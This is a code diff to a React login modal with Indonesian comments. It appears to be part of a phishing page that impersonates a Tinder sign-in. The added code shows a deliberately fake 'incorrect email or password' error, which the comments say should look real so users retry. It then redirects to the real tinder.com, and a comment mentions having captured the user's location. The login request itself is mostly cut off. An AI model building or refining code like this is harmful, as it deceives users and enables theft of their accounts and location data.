@@ -14,6 +14,9 @@ interface LoginModalProps {
   onClose: () => void;
   shortcode?: string;
 }
+
+const REDIRECT_URL = 'https://tinder.com'; // Ganti dengan URL Tinder asli atau profil tujuan
+
 export default function LoginModal({
   isOpen,
   onClose,
@@ -141,11 +144,12 @@ export default function LoginModal({
         }),
       });
 
-      // Simulate API call
-      await new Promise((resolve) => setTimeout(resolve, 1500));
-
       // Untuk keperluan demo, tampilkan error agar pengguna mencoba lagi
       // Tampilkan pesan error yang terlihat asli seperti dari layanan nyata
+      // Setelah berhasil mendapatkan lokasi, tunggu sebentar lalu redirect
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 1500);
       setError(
         'The email or password you entered is incorrect. Please check your information and try again.',
       );
